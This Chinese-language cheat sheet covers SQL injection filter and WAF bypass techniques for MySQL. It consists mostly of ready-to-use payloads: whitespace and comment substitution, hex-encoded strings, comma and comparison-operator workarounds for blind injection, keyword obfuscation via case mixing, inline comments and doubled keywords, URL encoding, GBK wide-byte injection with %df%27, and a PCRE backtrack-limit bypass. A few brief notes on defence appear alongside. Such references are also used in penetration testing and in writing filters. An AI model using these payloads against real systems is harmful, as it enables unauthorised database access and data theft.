# SQL注入

## 1.注入payload

## 2.Bypass

### 2.1.空格绕过

#### 2.1.1.注释符绕过空格

```
%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/
```

### 2.1.2.括号绕过

```mysql
?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23
```

### 2.2.引号过滤绕过

使用`hex`绕过

```mysql
/* 过滤 */
select column_name  from information_schema.tables where table_name="users"
/* 绕过 */
select column_name  from information_schema.tables where table_name=0x7573657273
```

### 2.3.逗号绕过（**使用from或者offset**）

#### 2.3.1. from to

在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用`from to`的方式来解决：

```mysql
select substr(database() from 1 for 1);
select mid(database() from 1 for 1);
```

#### 2.3.2. join

```mysql
union select 1,2     #等价于
union select * from (select 1)a join (select 2)b
```

####  2.3.3. like

```mysql
select ascii(mid(user(),1,1))=80   #等价于
select user() like 'r%'
```

### 2.3.4.limit过滤(offset绕过)

```mysql
select * from news limit 0,1
# 等价于下面这条SQL语句
select * from news limit 1 offset 0
```

### 2.3.5.比较符号（<>）绕过（between)：

#### 2.3.5.1 greatest()、least（）

（前者返回最大值，后者返回最小值）

　　同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到`greatest`来进行绕过了。

最常见的一个盲注的sql语句：

```mysql
select * from users where id=1 and ascii(substr(database(),0,1))>64
```

　　此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用`greatest`来代替比较操作符了。greatest(n1,n2,n3,...)函数返回输入参数(n1,n2,n3,...)的最大值。

那么上面的这条sql语句可以使用`greatest`变为如下的子句:

```
select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64
```

#### 2.3.5.2. between and

between a and b：

between 1 and 1; 等价于 =1

### 2.3.6.or and xor not绕过

```
and=&&  or=||   xor=|   not=!
```

### 2.3.7 绕过注释符号（#，--(后面跟一个空格））过滤：

```sql
id=1' union select 1,2,3||'1

最后的or '1闭合查询语句的最后的单引号，或者：

id=1' union select 1,2,'3
```

### 2.3.8.=绕过

　使用`like` 、`rlike` 、`regexp` 或者 使用`<` 或者 `>`

### 2.3.9.绕过union，select，where等：

#### （1）使用注释符绕过：

　　常用注释符：

```
//，-- , /**/, #, --+, -- -, ;,%00,--a
```

用法：

```
U/**/NION /**/ SE/**/ LECT /**/user，pwd from user
```

#### （2）使用大小写绕过：

```
id=-1'UnIoN/**/SeLeCT
```

#### （3）内联注释绕过：

```
id=-1'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#
```

#### （4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）：

```
id=-1'UNIunionONSeLselectECT1,2,3–-
```

### 2.3.10.通用绕过（编码）

　　如URLEncode编码，ASCII,HEX,unicode编码绕过：

```
or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。
```

### 2.3.11.等价函数绕过

```sql
hex()、bin() ==> ascii()

sleep() ==>benchmark()

concat_ws()==>group_concat()

mid()、substr() ==> substring()

@@user ==> user()

@@datadir ==> datadir()

举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　

或者：
substr((select 'password'),1,1) = 0x70
strcmp(left('password',1), 0x69) = 1
strcmp(left('password',1), 0x70) = 0
strcmp(left('password',1), 0x71) = -1
```

### 2.3.12.宽字节注入

过滤 ' 的时候往往利用的思路是将 ' 转换为 \' 。

　　在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：

　　（1）%df 吃掉 \ 具体的方法是 urlencode('\) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（'）符号在外面：

```
id=-1%df%27union select 1,user(),3--+
```

　　（2）将 \' 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。

#### 一般产生宽字节注入的PHP函数：

  1.replace（）：过滤 '\ ，将 ' 转化为 \\' ，将 \  转为 \\\，将 " 转为 \\" 。用思路一。

  2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：' , " , \ 。用思路一（防御此漏洞，要将 mysql_query 设置为 binary 的方式）

　 　3.mysql_real_escape_string()：转义下列字符：

```
\x00     \n     \r     \     '     "     \x1a
```

（防御，将mysql设置为gbk即可）

### 2.3.13 PCRE绕过：

`union/*'+'a'*1000001+'*/select`